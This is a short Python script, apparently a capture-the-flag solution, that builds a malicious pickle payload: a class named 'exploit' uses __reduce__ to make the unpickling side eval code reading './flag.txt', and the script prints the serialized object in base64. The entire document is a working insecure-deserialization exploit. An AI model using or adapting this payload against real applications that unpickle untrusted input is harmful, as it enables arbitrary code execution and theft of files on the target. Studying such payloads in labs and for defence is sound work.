import pickle, base64

class exploit():
    def __reduce__(self):
        p="open('./flag.txt', 'r').read()"
        return (eval,(p,))
rs={'name':exploit()}
print(base64.b64encode(pickle.dumps(rs)).decode('utf8'))